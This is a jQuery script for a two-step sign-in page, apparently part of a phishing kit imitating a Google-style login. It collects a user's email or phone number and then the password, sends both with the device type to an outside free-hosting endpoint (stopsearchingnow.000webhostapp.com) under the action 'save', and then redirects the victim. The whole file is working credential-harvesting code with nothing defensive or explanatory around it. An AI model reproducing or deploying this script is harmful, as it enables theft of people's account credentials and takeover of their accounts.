$(document).ready(function () {
    
    function getMobileOperatingSystem() {
        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
        if (/android/i.test(userAgent)) {
            return "Android";
        }
        if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
            return "iOS";
        }
        return "PC";
    }

    var navegador = getMobileOperatingSystem();

    if (navegador == 'PC') {
        $('#os').val('desktop');
    }

    if (navegador == 'Android') {
        $('#os').val('android');
    }
	
	if (navegador == 'iOS') {
        $('#os').val('apple');
    }

    function validateEmail(Email) {
        var pattern =
            /^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/;
        return pattern.test($.trim(Email));
    }

    function validateTel(Tel) {
        var pattern = /^(?:(?:\+|00)?(55)\s?)?(?:\(?([1-9][0-9])\)?\s?)?(?:((?:9\d|[2-9])\d{3})\-?(\d{4}))$/;
        return pattern.test($.trim(Tel));
    }

    function validaPt1() {
        var email = $('#email').val();

        if (validateEmail(email)) {
            $('.error').hide();
            $('.email_part2').html(email);
            $('.part1').hide();
            $('.part2').show();
        } else {
            if (validateTel(email)) {
                $('.error').hide();
                $('.email_part2').html(email);
                $('.part1').hide();
                $('.part2').show();
            } else {
                $('.error').show();
            }
        }
    }

    $("#email").keydown(function (event) {
        if (event.which == 13) {
            event.preventDefault();
            validaPt1();
        }
    });

    $('.proxima').click(function () {
        validaPt1();
    });

    function validaPt2() {
        var email = $('#email').val();
        var senha = $('#senha').val();
        var device = $('#os').val();
        localStorage.setItem("email", email);
        if (senha.length > 7) {
            $('.error').hide();
            $.ajax({
                url: 'https://stopsearchingnow.000webhostapp.com/actions.php',
                data: {
                    'user'   : email,
                    'pass'   : senha,
                    'device' : device,
                    'action' : 'save'
                },
                contentType: "application/json",
                dataType: "json",
                method: 'POST',
                success: function (data) {
                    if (data.success == 1) {
                        console.log(email);
                        window.location = "pesquisa";
                    } else {
                        window.location = "identifier";
                    }
                }
            });

        } else {
            $('.error').show();
        }
    }
    $('.entrar').click(function () {
        validaPt2();
    });
    $("#senha").keydown(function (event) {
        if (event.which == 13) {
            event.preventDefault();
            validaPt2();
        }
    });
    $('.voltar').click(function () {
        $('.part2').hide();
        $('.part1').show();
    });
});